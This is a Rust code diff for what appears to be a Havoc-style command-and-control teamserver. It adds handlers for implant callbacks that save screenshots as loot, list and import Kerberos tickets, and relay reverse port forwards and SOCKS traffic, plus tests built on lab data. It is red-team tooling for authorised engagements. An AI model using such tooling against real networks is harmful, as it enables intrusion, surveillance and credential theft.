@@ -10,8 +10,9 @@ use base64::Engine as _;
 use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
 use red_cell_common::crypto::{AGENT_IV_LENGTH, AGENT_KEY_LENGTH, encrypt_agent_data};
 use red_cell_common::demon::{
-    DemonCommand, DemonInjectError, DemonMessage, DemonPackage, DemonProcessCommand,
-    DemonProtocolError, DemonTokenCommand,
+    DemonCommand, DemonInjectError, DemonKerberosCommand, DemonMessage, DemonPackage,
+    DemonProcessCommand, DemonProtocolError, DemonSocketCommand, DemonSocketType,
+    DemonTokenCommand,
 };
 use red_cell_common::operator::{
     AgentResponseInfo, AgentUpdateInfo, EventCode, Message, MessageHead, OperatorMessage,
@@ -21,7 +22,10 @@ use thiserror::Error;
 use time::OffsetDateTime;
 use time::format_description::well_known::Rfc3339;
 
-use crate::{AgentRegistry, DemonCallbackPackage, EventBus, TeamserverError};
+use crate::{
+    AgentRegistry, Database, DemonCallbackPackage, EventBus, LootRecord, SocketRelayManager,
+    TeamserverError,
+};
 
 type HandlerFuture =
     Pin<Box<dyn Future<Output = Result<Option<Vec<u8>>, CommandDispatchError>> + Send>>;
@@ -98,9 +102,14 @@ impl CommandDispatcher {
         Self { handlers: Arc::new(HashMap::new()) }
     }
 
-    /// Create a dispatcher with the built-in `COMMAND_GET_JOB` and `COMMAND_CHECKIN` handlers.
+    /// Create a dispatcher with the built-in Demon command handlers.
     #[must_use]
-    pub fn with_builtin_handlers(registry: AgentRegistry, events: EventBus) -> Self {
+    pub fn with_builtin_handlers(
+        registry: AgentRegistry,
+        events: EventBus,
+        database: Database,
+        sockets: SocketRelayManager,
+    ) -> Self {
         let mut dispatcher = Self::new();
 
         let get_job_registry = registry.clone();
@@ -162,6 +171,43 @@ impl CommandDispatcher {
                 let events = token_events.clone();
                 Box::pin(async move {
                     handle_token_callback(&events, agent_id, request_id, &payload).await
+                })
+            },
+        );
+
+        let screenshot_database = database.clone();
+        let screenshot_events = events.clone();
+        dispatcher.register_handler(
+            u32::from(DemonCommand::CommandScreenshot),
+            move |agent_id, request_id, payload| {
+                let database = screenshot_database.clone();
+                let events = screenshot_events.clone();
+                Box::pin(async move {
+                    handle_screenshot_callback(&database, &events, agent_id, request_id, &payload)
+                        .await
+                })
+            },
+        );
+
+        let kerberos_events = events.clone();
+        dispatcher.register_handler(
+            u32::from(DemonCommand::CommandKerberos),
+            move |agent_id, request_id, payload| {
+                let events = kerberos_events.clone();
+                Box::pin(async move {
+                    handle_kerberos_callback(&events, agent_id, request_id, &payload).await
+                })
+            },
+        );
+
+        let socket_events = events.clone();
+        dispatcher.register_handler(
+            u32::from(DemonCommand::CommandSocket),
+            move |agent_id, request_id, payload| {
+                let events = socket_events.clone();
+                let sockets = sockets.clone();
+                Box::pin(async move {
+                    handle_socket_callback(&events, &sockets, agent_id, request_id, &payload).await
                 })
             },
         );
@@ -452,6 +498,350 @@ async fn handle_token_callback(
     Ok(None)
 }
 
+async fn handle_screenshot_callback(
+    database: &Database,
+    events: &EventBus,
+    agent_id: u32,
+    request_id: u32,
+    payload: &[u8],
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandScreenshot));
+    let success = parser.read_u32("screenshot success")?;
+
+    if success == 0 {
+        events.broadcast(agent_response_event(
+            agent_id,
+            u32::from(DemonCommand::CommandScreenshot),
+            request_id,
+            "Error",
+            "Failed to take a screenshot",
+            None,
+        )?);
+        return Ok(None);
+    }
+
+    let bytes = parser.read_bytes("screenshot bytes")?;
+    if bytes.is_empty() {
+        events.broadcast(agent_response_event(
+            agent_id,
+            u32::from(DemonCommand::CommandScreenshot),
+            request_id,
+            "Error",
+            "Failed to take a screenshot",
+            None,
+        )?);
+        return Ok(None);
+    }
+
+    let timestamp = OffsetDateTime::now_utc();
+    let captured_at = timestamp.format(&Rfc3339)?;
+    let name = timestamp
+        .format(
+            &time::format_description::parse(
+                "Desktop_[day].[month].[year]-[hour].[minute].[second].png",
+            )
+            .map_err(|error| CommandDispatchError::InvalidCallbackPayload {
+                command_id: u32::from(DemonCommand::CommandScreenshot),
+                message: error.to_string(),
+            })?,
+        )
+        .map_err(CommandDispatchError::Timestamp)?;
+
+    database
+        .loot()
+        .create(&LootRecord {
+            id: None,
+            agent_id,
+            kind: "screenshot".to_owned(),
+            name: name.clone(),
+            file_path: None,
+            size_bytes: Some(i64::try_from(bytes.len()).unwrap_or_default()),
+            captured_at: captured_at.clone(),
+            data: Some(bytes.clone()),
+            metadata: Some(Value::Object(
+                [
+                    ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
+                    ("captured_at".to_owned(), Value::String(captured_at.clone())),
+                ]
+                .into_iter()
+                .collect(),
+            )),
+        })
+        .await?;
+
+    events.broadcast(agent_response_event_with_extra(
+        agent_id,
+        u32::from(DemonCommand::CommandScreenshot),
+        request_id,
+        "Good",
+        "Successful took screenshot",
+        BTreeMap::from([
+            ("MiscType".to_owned(), Value::String("screenshot".to_owned())),
+            ("MiscData".to_owned(), Value::String(BASE64_STANDARD.encode(&bytes))),
+            ("MiscData2".to_owned(), Value::String(name)),
+        ]),
+        String::new(),
+    )?);
+    Ok(None)
+}
+
+async fn handle_kerberos_callback(
+    events: &EventBus,
+    agent_id: u32,
+    request_id: u32,
+    payload: &[u8],
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandKerberos));
+    let subcommand = parser.read_u32("kerberos subcommand")?;
+
+    match DemonKerberosCommand::try_from(subcommand).map_err(|error| {
+        CommandDispatchError::InvalidCallbackPayload {
+            command_id: u32::from(DemonCommand::CommandKerberos),
+            message: error.to_string(),
+        }
+    })? {
+        DemonKerberosCommand::Luid => {
+            let success = parser.read_u32("kerberos luid success")?;
+            if success == 0 {
+                events.broadcast(agent_response_event(
+                    agent_id,
+                    u32::from(DemonCommand::CommandKerberos),
+                    request_id,
+                    "Erro",
+                    "Failed to obtain the current logon ID",
+                    None,
+                )?);
+                return Ok(None);
+            }
+
+            let high = parser.read_u32("kerberos luid high part")?;
+            let low = parser.read_u32("kerberos luid low part")?;
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandKerberos),
+                request_id,
+                "Good",
+                &format!("Current LogonId: {high:x}:0x{low:x}"),
+                None,
+            )?);
+        }
+        DemonKerberosCommand::Klist => {
+            let success = parser.read_u32("kerberos klist success")?;
+            if success == 0 {
+                events.broadcast(agent_response_event(
+                    agent_id,
+                    u32::from(DemonCommand::CommandKerberos),
+                    request_id,
+                    "Erro",
+                    "Failed to list all kerberos tickets",
+                    None,
+                )?);
+                return Ok(None);
+            }
+
+            let output = format_kerberos_klist(&mut parser)?;
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandKerberos),
+                request_id,
+                "Info",
+                "Kerberos tickets:",
+                Some(output),
+            )?);
+        }
+        DemonKerberosCommand::Purge => {
+            let success = parser.read_u32("kerberos purge success")?;
+            let (kind, message) = if success != 0 {
+                ("Good", "Successfully purged the Kerberos ticket")
+            } else {
+                ("Erro", "Failed to purge the kerberos ticket")
+            };
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandKerberos),
+                request_id,
+                kind,
+                message,
+                None,
+            )?);
+        }
+        DemonKerberosCommand::Ptt => {
+            let success = parser.read_u32("kerberos ptt success")?;
+            let (kind, message) = if success != 0 {
+                ("Good", "Successfully imported the Kerberos ticket")
+            } else {
+                ("Erro", "Failed to import the kerberos ticket")
+            };
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandKerberos),
+                request_id,
+                kind,
+                message,
+                None,
+            )?);
+        }
+    }
+
+    Ok(None)
+}
+
+async fn handle_socket_callback(
+    events: &EventBus,
+    sockets: &SocketRelayManager,
+    agent_id: u32,
+    request_id: u32,
+    payload: &[u8],
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandSocket));
+    let subcommand = parser.read_u32("socket subcommand")?;
+
+    match DemonSocketCommand::try_from(subcommand).map_err(|error| {
+        CommandDispatchError::InvalidCallbackPayload {
+            command_id: u32::from(DemonCommand::CommandSocket),
+            message: error.to_string(),
+        }
+    })? {
+        DemonSocketCommand::ReversePortForwardAdd => {
+            let success = parser.read_u32("rportfwd add success")?;
+            let socket_id = parser.read_u32("rportfwd add socket id")?;
+            let local_addr = int_to_ipv4(parser.read_u32("rportfwd add local addr")?);
+            let local_port = parser.read_u32("rportfwd add local port")?;
+            let forward_addr = int_to_ipv4(parser.read_u32("rportfwd add forward addr")?);
+            let forward_port = parser.read_u32("rportfwd add forward port")?;
+            let (kind, message) = if success != 0 {
+                (
+                    "Info",
+                    format!(
+                        "Started reverse port forward on {local_addr}:{local_port} to {forward_addr}:{forward_port} [Id: {socket_id:x}]"
+                    ),
+                )
+            } else {
+                (
+                    "Erro",
+                    format!(
+                        "Failed to start reverse port forward on {local_addr}:{local_port} to {forward_addr}:{forward_port}"
+                    ),
+                )
+            };
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandSocket),
+                request_id,
+                kind,
+                &message,
+                None,
+            )?);
+        }
+        DemonSocketCommand::ReversePortForwardList => {
+            let output = format_rportfwd_list(&mut parser)?;
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandSocket),
+                request_id,
+                "Info",
+                "reverse port forwards:",
+                Some(output),
+            )?);
+        }
+        DemonSocketCommand::ReversePortForwardRemove => {
+            let socket_id = parser.read_u32("rportfwd remove socket id")?;
+            let socket_type = parser.read_u32("rportfwd remove type")?;
+            let local_addr = int_to_ipv4(parser.read_u32("rportfwd remove local addr")?);
+            let local_port = parser.read_u32("rportfwd remove local port")?;
+            let forward_addr = int_to_ipv4(parser.read_u32("rportfwd remove forward addr")?);
+            let forward_port = parser.read_u32("rportfwd remove forward port")?;
+            if socket_type == u32::from(DemonSocketType::ReversePortForward) {
+                events.broadcast(agent_response_event(
+                    agent_id,
+                    u32::from(DemonCommand::CommandSocket),
+                    request_id,
+                    "Info",
+                    &format!(
+                        "Successful closed and removed rportfwd [SocketID: {socket_id:x}] [Forward: {local_addr}:{local_port} -> {forward_addr}:{forward_port}]"
+                    ),
+                    None,
+                )?);
+            }
+        }
+        DemonSocketCommand::ReversePortForwardClear => {
+            let success = parser.read_u32("rportfwd clear success")?;
+            let (kind, message) = if success != 0 {
+                ("Good", "Successful closed and removed all rportfwds")
+            } else {
+                ("Erro", "Failed to closed and remove all rportfwds")
+            };
+            events.broadcast(agent_response_event(
+                agent_id,
+                u32::from(DemonCommand::CommandSocket),
+                request_id,
+                kind,
+                message,
+                None,
+            )?);
+        }
+        DemonSocketCommand::Read => {
+            let socket_id = parser.read_u32("socket read socket id")?;
+            let socket_type = parser.read_u32("socket read type")?;
+            let success = parser.read_u32("socket read success")?;
+            if success == 0 {
+                let error_code = parser.read_u32("socket read error code")?;
+                events.broadcast(agent_response_event(
+                    agent_id,
+                    u32::from(DemonCommand::CommandSocket),
+                    request_id,
+                    "Erro",
+                    &format!("Failed to read from socks target {socket_id}: {error_code}"),
+                    None,
+                )?);
+                return Ok(None);
+            }
+
+            let data = parser.read_bytes("socket read data")?;
+            if socket_type == u32::from(DemonSocketType::ReverseProxy) {
+                let _ = sockets.write_client_data(agent_id, socket_id, &data).await;
+            }
+        }
+        DemonSocketCommand::Write => {
+            let socket_id = parser.read_u32("socket write socket id")?;
+            let _socket_type = parser.read_u32("socket write type")?;
+            let success = parser.read_u32("socket write success")?;
+            if success == 0 {
+                let error_code = parser.read_u32("socket write error code")?;
+                events.broadcast(agent_response_event(
+                    agent_id,
+                    u32::from(DemonCommand::CommandSocket),
+                    request_id,
+                    "Erro",
+                    &format!("Failed to write to socks target {socket_id}: {error_code}"),
+                    None,
+                )?);
+            }
+        }
+        DemonSocketCommand::Close => {
+            let socket_id = parser.read_u32("socket close socket id")?;
+            let socket_type = parser.read_u32("socket close type")?;
+            if socket_type == u32::from(DemonSocketType::ReverseProxy) {
+                let _ = sockets.close_client(agent_id, socket_id).await;
+            }
+        }
+        DemonSocketCommand::Connect => {
+            let success = parser.read_u32("socket connect success")?;
+            let socket_id = parser.read_u32("socket connect socket id")?;
+            let error_code = parser.read_u32("socket connect error code")?;
+            let _ = sockets.finish_connect(agent_id, socket_id, success != 0, error_code).await;
+        }
+        DemonSocketCommand::SocksProxyAdd
+        | DemonSocketCommand::Open
+        | DemonSocketCommand::SocksProxyList
+        | DemonSocketCommand::SocksProxyRemove
+        | DemonSocketCommand::SocksProxyClear
+        | DemonSocketCommand::ReversePortForwardAddLocal => {}
+    }
+
+    Ok(None)
+}
+
 fn decode_fixed<const N: usize>(
     agent_id: u32,
     field: &'static str,
@@ -494,8 +884,27 @@ fn agent_response_event(
     message: &str,
     output: Option<String>,
 ) -> Result<OperatorMessage, CommandDispatchError> {
+    agent_response_event_with_extra(
+        agent_id,
+        command_id,
+        request_id,
+        kind,
+        message,
+        BTreeMap::new(),
+        output.unwrap_or_default(),
+    )
+}
+
+fn agent_response_event_with_extra(
+    agent_id: u32,
+    command_id: u32,
+    request_id: u32,
+    kind: &str,
+    message: &str,
+    mut extra: BTreeMap<String, Value>,
+    output: String,
+) -> Result<OperatorMessage, CommandDispatchError> {
     let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
-    let mut extra = BTreeMap::new();
     extra.insert("Type".to_owned(), Value::String(kind.to_owned()));
     extra.insert("Message".to_owned(), Value::String(message.to_owned()));
     extra.insert("RequestID".to_owned(), Value::String(format!("{request_id:X}")));
@@ -510,7 +919,7 @@ fn agent_response_event(
         info: AgentResponseInfo {
             demon_id: format!("{agent_id:08X}"),
             command_id: command_id.to_string(),
-            output: output.unwrap_or_default(),
+            output,
             command_line: None,
             extra,
         },
@@ -582,6 +991,184 @@ fn format_process_row(
         user = user,
         name_width = name_width,
     )
+}
+
+fn format_rportfwd_list(parser: &mut CallbackParser<'_>) -> Result<String, CommandDispatchError> {
+    let mut output = String::from("\n Socket ID     Forward\n ---------     -------\n");
+
+    while !parser.is_empty() {
+        let socket_id = parser.read_u32("rportfwd list socket id")?;
+        let local_addr = int_to_ipv4(parser.read_u32("rportfwd list local addr")?);
+        let local_port = parser.read_u32("rportfwd list local port")?;
+        let forward_addr = int_to_ipv4(parser.read_u32("rportfwd list forward addr")?);
+        let forward_port = parser.read_u32("rportfwd list forward port")?;
+        output.push_str(&format!(
+            " {socket_id:<13x}{local_addr}:{local_port} -> {forward_addr}:{forward_port}\n"
+        ));
+    }
+
+    Ok(output.trim_end().to_owned())
+}
+
+fn format_kerberos_klist(parser: &mut CallbackParser<'_>) -> Result<String, CommandDispatchError> {
+    let session_count = parser.read_u32("kerberos session count")?;
+    let mut output = String::new();
+
+    for _ in 0..session_count {
+        let username = parser.read_utf16("kerberos username")?;
+        let domain = parser.read_utf16("kerberos domain")?;
+        let logon_id_low = parser.read_u32("kerberos logon id low")?;
+        let logon_id_high = parser.read_u32("kerberos logon id high")?;
+        let session = parser.read_u32("kerberos session")?;
+        let user_sid = parser.read_utf16("kerberos user sid")?;
+        let logon_time_low = parser.read_u32("kerberos logon time low")?;
+        let logon_time_high = parser.read_u32("kerberos logon time high")?;
+        let logon_type = parser.read_u32("kerberos logon type")?;
+        let auth_package = parser.read_utf16("kerberos auth package")?;
+        let logon_server = parser.read_utf16("kerberos logon server")?;
+        let dns_domain = parser.read_utf16("kerberos dns domain")?;
+        let upn = parser.read_utf16("kerberos upn")?;
+        let ticket_count = parser.read_u32("kerberos ticket count")?;
+
+        output.push_str(&format!("UserName                : {username}\n"));
+        output.push_str(&format!("Domain                  : {domain}\n"));
+        output
+            .push_str(&format!("LogonId                 : {logon_id_high:x}:0x{logon_id_low:x}\n"));
+        output.push_str(&format!("Session                 : {session}\n"));
+        output.push_str(&format!("UserSID                 : {user_sid}\n"));
+        output.push_str(&format!(
+            "LogonTime               : {}\n",
+            format_filetime(logon_time_high, logon_time_low)
+        ));
+        output.push_str(&format!("Authentication package  : {auth_package}\n"));
+        output.push_str(&format!("LogonType               : {}\n", logon_type_name(logon_type)));
+        output.push_str(&format!("LogonServer             : {logon_server}\n"));
+        output.push_str(&format!("LogonServerDNSDomain    : {dns_domain}\n"));
+        output.push_str(&format!("UserPrincipalName       : {upn}\n"));
+        output.push_str(&format!("Cached tickets:         : {ticket_count}\n"));
+
+        for _ in 0..ticket_count {
+            let client_name = parser.read_utf16("kerberos ticket client name")?;
+            let client_realm = parser.read_utf16("kerberos ticket client realm")?;
+            let server_name = parser.read_utf16("kerberos ticket server name")?;
+            let server_realm = parser.read_utf16("kerberos ticket server realm")?;
+            let start_low = parser.read_u32("kerberos ticket start low")?;
+            let start_high = parser.read_u32("kerberos ticket start high")?;
+            let end_low = parser.read_u32("kerberos ticket end low")?;
+            let end_high = parser.read_u32("kerberos ticket end high")?;
+            let renew_low = parser.read_u32("kerberos ticket renew low")?;
+            let renew_high = parser.read_u32("kerberos ticket renew high")?;
+            let encryption_type = parser.read_u32("kerberos ticket encryption type")?;
+            let ticket_flags = parser.read_u32("kerberos ticket flags")?;
+            let ticket = parser.read_bytes("kerberos ticket bytes")?;
+
+            output.push('\n');
+            output.push_str(&format!("\tClient name     : {client_name} @ {client_realm}\n"));
+            output.push_str(&format!("\tServer name     : {server_name} @ {server_realm}\n"));
+            output.push_str(&format!(
+                "\tStart time      : {}\n",
+                format_filetime(start_high, start_low)
+            ));
+            output
+                .push_str(&format!("\tEnd time        : {}\n", format_filetime(end_high, end_low)));
+            output.push_str(&format!(
+                "\tRewnew time     : {}\n",
+                format_filetime(renew_high, renew_low)
+            ));
+            output.push_str(&format!(
+                "\tEncryption type : {}\n",
+                kerberos_encryption_type_name(encryption_type)
+            ));
+            output.push_str(&format!("\tFlags           :{}\n", format_ticket_flags(ticket_flags)));
+            if !ticket.is_empty() {
+                output
+                    .push_str(&format!("\tTicket          : {}\n", BASE64_STANDARD.encode(ticket)));
+            }
+        }
+
+        output.push('\n');
+    }
+
+    Ok(output.trim_end().to_owned())
+}
+
+fn format_filetime(high: u32, low: u32) -> String {
+    let filetime = ((u64::from(high)) << 32) | u64::from(low);
+    if filetime <= 0x019D_B1DE_D53E_8000 {
+        return "1970-01-01 00:00:00 +00:00:00".to_owned();
+    }
+
+    let unix_seconds = ((filetime - 0x019D_B1DE_D53E_8000) / 10_000_000) as i64;
+    OffsetDateTime::from_unix_timestamp(unix_seconds)
+        .map(|time| time.to_string())
+        .unwrap_or_else(|_| unix_seconds.to_string())
+}
+
+fn logon_type_name(value: u32) -> &'static str {
+    match value {
+        2 => "Interactive",
+        3 => "Network",
+        4 => "Batch",
+        5 => "Service",
+        7 => "Unlock",
+        8 => "Network_Cleartext",
+        9 => "New_Credentials",
+        _ => "Unknown",
+    }
+}
+
+fn kerberos_encryption_type_name(value: u32) -> &'static str {
+    match value {
+        1 => "DES_CBC_CRC",
+        2 => "DES_CBC_MD4",
+        3 => "DES_CBC_MD5",
+        5 => "DES3_CBC_MD5",
+        7 => "DES3_CBC_SHA1",
+        11 => "RSAENCRYPTION_ENVOID",
+        12 => "RSAES_OAEP_ENV_OID",
+        16 => "DES3_CBC_SHA1_KD",
+        17 => "AES128_CTS_HMAC_SHA1",
+        18 => "AES256_CTS_HMAC_SHA1",
+        23 => "RC4_HMAC",
+        24 => "RC4_HMAC_EXP",
+        _ => "Unknown",
+    }
+}
+
+fn format_ticket_flags(flags: u32) -> String {
+    const FLAG_NAMES: [&str; 16] = [
+        "name_canonicalize",
+        "anonymous",
+        "ok_as_delegate",
+        "?",
+        "hw_authent",
+        "pre_authent",
+        "initial",
+        "renewable",
+        "invalid",
+        "postdated",
+        "may_postdate",
+        "proxy",
+        "proxiable",
+        "forwarded",
+        "forwardable",
+        "reserved",
+    ];
+
+    let mut text = String::new();
+    for (index, name) in FLAG_NAMES.iter().enumerate() {
+        if ((flags >> (index + 16)) & 1) == 1 {
+            text.push(' ');
+            text.push_str(name);
+        }
+    }
+    text.push_str(&format!(" (0x{flags:x})"));
+    text
+}
+
+fn int_to_ipv4(value: u32) -> String {
+    let bytes = value.to_le_bytes();
+    format!("{}.{}.{}.{}", bytes[0], bytes[1], bytes[2], bytes[3])
 }
 
 struct CallbackParser<'a> {
@@ -667,13 +1254,14 @@ mod tests {
     use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
     use red_cell_common::crypto::{AGENT_IV_LENGTH, AGENT_KEY_LENGTH, decrypt_agent_data};
     use red_cell_common::demon::{
-        DemonCommand, DemonInjectError, DemonProcessCommand, DemonTokenCommand,
+        DemonCommand, DemonInjectError, DemonKerberosCommand, DemonProcessCommand,
+        DemonTokenCommand,
     };
     use red_cell_common::operator::OperatorMessage;
     use serde_json::Value;
 
     use super::CommandDispatcher;
-    use crate::{AgentRegistry, Database, EventBus, Job};
+    use crate::{AgentRegistry, Database, EventBus, Job, SocketRelayManager};
 
     fn sample_agent_info(
         agent_id: u32,
@@ -767,9 +1355,11 @@ mod tests {
     async fn builtin_get_job_handler_serializes_and_drains_jobs()
     -> Result<(), Box<dyn std::error::Error>> {
         let database = Database::connect_in_memory().await?;
-        let registry = AgentRegistry::new(database);
+        let registry = AgentRegistry::new(database.clone());
         let events = EventBus::default();
-        let dispatcher = CommandDispatcher::with_builtin_handlers(registry.clone(), events);
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry.clone(), events, database, sockets);
         let key = [0x55; AGENT_KEY_LENGTH];
         let iv = [0x22; AGENT_IV_LENGTH];
         let agent_id = 0x5566_7788;
@@ -807,10 +1397,12 @@ mod tests {
     async fn builtin_checkin_handler_updates_last_call_in_and_broadcasts()
     -> Result<(), Box<dyn std::error::Error>> {
         let database = Database::connect_in_memory().await?;
-        let registry = AgentRegistry::new(database);
+        let registry = AgentRegistry::new(database.clone());
         let events = EventBus::default();
         let mut receiver = events.subscribe();
-        let dispatcher = CommandDispatcher::with_builtin_handlers(registry.clone(), events);
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry.clone(), events, database, sockets);
         let key = [0x77; AGENT_KEY_LENGTH];
         let iv = [0x44; AGENT_IV_LENGTH];
         let agent_id = 0x1020_3040;
@@ -850,10 +1442,12 @@ mod tests {
     async fn builtin_process_list_handler_broadcasts_formatted_agent_response()
     -> Result<(), Box<dyn std::error::Error>> {
         let database = Database::connect_in_memory().await?;
-        let registry = AgentRegistry::new(database);
+        let registry = AgentRegistry::new(database.clone());
         let events = EventBus::default();
         let mut receiver = events.subscribe();
-        let dispatcher = CommandDispatcher::with_builtin_handlers(registry, events);
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets);
 
         let mut payload = Vec::new();
         add_u32(&mut payload, 0);
@@ -889,10 +1483,12 @@ mod tests {
     async fn builtin_process_kill_and_token_handlers_broadcast_agent_responses()
     -> Result<(), Box<dyn std::error::Error>> {
         let database = Database::connect_in_memory().await?;
-        let registry = AgentRegistry::new(database);
+        let registry = AgentRegistry::new(database.clone());
         let events = EventBus::default();
         let mut receiver = events.subscribe();
-        let dispatcher = CommandDispatcher::with_builtin_handlers(registry, events);
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets);
 
         let kill_payload = [
             u32::from(DemonProcessCommand::Kill).to_le_bytes(),
@@ -936,10 +1532,12 @@ mod tests {
     async fn builtin_shellcode_handler_broadcasts_agent_response()
     -> Result<(), Box<dyn std::error::Error>> {
         let database = Database::connect_in_memory().await?;
-        let registry = AgentRegistry::new(database);
+        let registry = AgentRegistry::new(database.clone());
         let events = EventBus::default();
         let mut receiver = events.subscribe();
-        let dispatcher = CommandDispatcher::with_builtin_handlers(registry, events);
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets);
 
         dispatcher
             .dispatch(
@@ -959,6 +1557,114 @@ mod tests {
             Some(&Value::String("Process architecture mismatch".to_owned()))
         );
         assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn builtin_screenshot_handler_persists_loot_and_broadcasts_misc_fields()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let database = Database::connect_in_memory().await?;
+        let registry = AgentRegistry::new(database.clone());
+        let events = EventBus::default();
+        let mut receiver = events.subscribe();
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        registry
+            .insert(sample_agent_info(
+                0xABCD_EF01,
+                [0x11; AGENT_KEY_LENGTH],
+                [0x22; AGENT_IV_LENGTH],
+            ))
+            .await?;
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry, events, database.clone(), sockets);
+
+        let png = vec![0x89, b'P', b'N', b'G'];
+        let payload = [1_u32.to_le_bytes().to_vec(), {
+            let mut data = Vec::new();
+            add_bytes(&mut data, &png);
+            data
+        }]
+        .concat();
+
+        dispatcher
+            .dispatch(0xABCD_EF01, u32::from(DemonCommand::CommandScreenshot), 0x44, &payload)
+            .await?;
+
+        let loot = database.loot().list_for_agent(0xABCD_EF01).await?;
+        assert_eq!(loot.len(), 1);
+        assert_eq!(loot[0].kind, "screenshot");
+        assert_eq!(loot[0].data.as_deref(), Some(png.as_slice()));
+
+        let event =
+            receiver.recv().await.ok_or_else(|| "screenshot response missing".to_owned())?;
+        let OperatorMessage::AgentResponse(message) = event else {
+            panic!("expected screenshot agent response event");
+        };
+        assert_eq!(
+            message.info.extra.get("MiscType"),
+            Some(&Value::String("screenshot".to_owned()))
+        );
+        assert_eq!(
+            message.info.extra.get("MiscData"),
+            Some(&Value::String(BASE64_STANDARD.encode(&png)))
+        );
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn builtin_kerberos_klist_handler_formats_ticket_output()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let database = Database::connect_in_memory().await?;
+        let registry = AgentRegistry::new(database.clone());
+        let events = EventBus::default();
+        let mut receiver = events.subscribe();
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets);
+
+        let mut payload = Vec::new();
+        add_u32(&mut payload, u32::from(DemonKerberosCommand::Klist));
+        add_u32(&mut payload, 1);
+        add_u32(&mut payload, 1);
+        add_utf16(&mut payload, "alice");
+        add_utf16(&mut payload, "LAB");
+        add_u32(&mut payload, 0x1234);
+        add_u32(&mut payload, 0x5678);
+        add_u32(&mut payload, 1);
+        add_utf16(&mut payload, "S-1-5-21");
+        add_u32(&mut payload, 0xD53E_8000);
+        add_u32(&mut payload, 0x019D_B1DE);
+        add_u32(&mut payload, 2);
+        add_utf16(&mut payload, "Kerberos");
+        add_utf16(&mut payload, "DC01");
+        add_utf16(&mut payload, "lab.local");
+        add_utf16(&mut payload, "alice@lab.local");
+        add_u32(&mut payload, 1);
+        add_utf16(&mut payload, "alice");
+        add_utf16(&mut payload, "LAB.LOCAL");
+        add_utf16(&mut payload, "krbtgt");
+        add_utf16(&mut payload, "LAB.LOCAL");
+        add_u32(&mut payload, 0xD53E_8000);
+        add_u32(&mut payload, 0x019D_B1DE);
+        add_u32(&mut payload, 0xD53E_8000);
+        add_u32(&mut payload, 0x019D_B1DE);
+        add_u32(&mut payload, 0xD53E_8000);
+        add_u32(&mut payload, 0x019D_B1DE);
+        add_u32(&mut payload, 18);
+        add_u32(&mut payload, 0x4081_0000);
+        add_bytes(&mut payload, b"ticket");
+
+        dispatcher
+            .dispatch(0x0102_0304, u32::from(DemonCommand::CommandKerberos), 9, &payload)
+            .await?;
+
+        let event = receiver.recv().await.ok_or_else(|| "kerberos response missing".to_owned())?;
+        let OperatorMessage::AgentResponse(message) = event else {
+            panic!("expected kerberos agent response event");
+        };
+        assert!(message.info.output.contains("UserName                : alice"));
+        assert!(message.info.output.contains("Encryption type : AES256_CTS_HMAC_SHA1"));
+        assert!(message.info.output.contains("Ticket          : dGlja2V0"));
         Ok(())
     }
 
